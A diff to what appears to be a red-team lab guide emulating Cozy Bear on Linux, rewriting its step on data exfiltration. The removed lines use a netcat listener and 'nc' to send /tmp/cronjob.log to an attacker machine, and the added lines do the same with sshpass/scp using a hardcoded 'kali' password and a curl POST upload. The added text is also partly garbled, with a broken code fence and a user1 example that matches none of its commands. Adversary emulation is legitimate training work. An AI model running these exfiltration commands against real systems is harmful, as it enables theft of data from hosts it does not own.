@@ -116,31 +116,22 @@ Monitor the /tmp/cronjob.log file for updates by running cat /tmp/cronjob.log.
 ```
 cat /tmp/cronjob.log
 ```
-### 12. Now we will demonstrate data exfiltration from a compromised Linux system, simulating how Cozy Bear could extract sensitive information after gaining access to a target. For this demo, we will use the nc (netcat) utility to exfiltrate data to a remote server.
+### 12. Now we will demonstrate data exfiltration from a compromised Linux system, simulating how Cozy Bear could extract sensitive information after gaining access to a target. 
 
-Here's a step-by-step guide on how to set up and perform the demonstration:
+Here's how to securely transfer a file using scp:
 
-Set up the attacker's machine: You will need two machines for this demo: one simulating the compromised system (target) and another acting as the attacker's machine (receiver). On the attacker's machine, open a terminal and run the following command to start a netcat listener:
+Make sure that the remote machine has an SSH server running and that you have the necessary credentials (username and password or key pair) to access it.
 
+Use the scp command on the local machine to transfer the file. Replace <remote_user>, <remote_ip>, and <remote_directory> with the appropriate values for your setup:
+
+``
+scp /tmp/cronjob.log kali@192.168.101.51:/tmp/received_cronjob.log
 ```
-nc -l -p 12345 > /tmp/cronjob.log
-```
+sshpass -p 'kali' scp /tmp/cronjob.log kali@192.168.101.51:/tmp/received_cronjob.log
 
-This command listens on port 12345 and writes incoming data to a file called exfiltrated_data.txt.
+curl -X POST -H "Content-Type: application/octet-stream" --data-binary "@/tmp/cronjob.log" http://192.168.101.51:8080/upload
 
 
-Exfiltrate the data: On the target machine, use netcat to send the contents of sensitive_data.txt to the attacker's machine. Replace <Attacker_IP> with the IP address of the attacker's machine:
+For example, if the remote user is user1, the remote IP is 192.168.101.51, and you want to save the file in the /home/user1 directory:
 
-```
-nc 192.168.101.51 12345 < /tmp/cronjob.log
-```
-
-Verify the exfiltrated data: On the attacker's machine, check the contents of exfiltrated_data.txt to ensure that the data has been successfully exfiltrated:
-
-```
-cat cronjob.log
-```
-
-You should see the content of the cronjob.log file from the target machine.
-
-This demonstration shows a simple example of data exfiltration using netcat. In a real-world scenario, threat actors might use more advanced techniques, such as encrypting the data, tunneling the traffic through other protocols, or using custom tools to avoid detection.
+The scp command will prompt you for the password if you're using password-based authentication or use the appropriate key pair if you're using key-based authentication. After successful authentication, the file will be securely transferred to the remote machine.
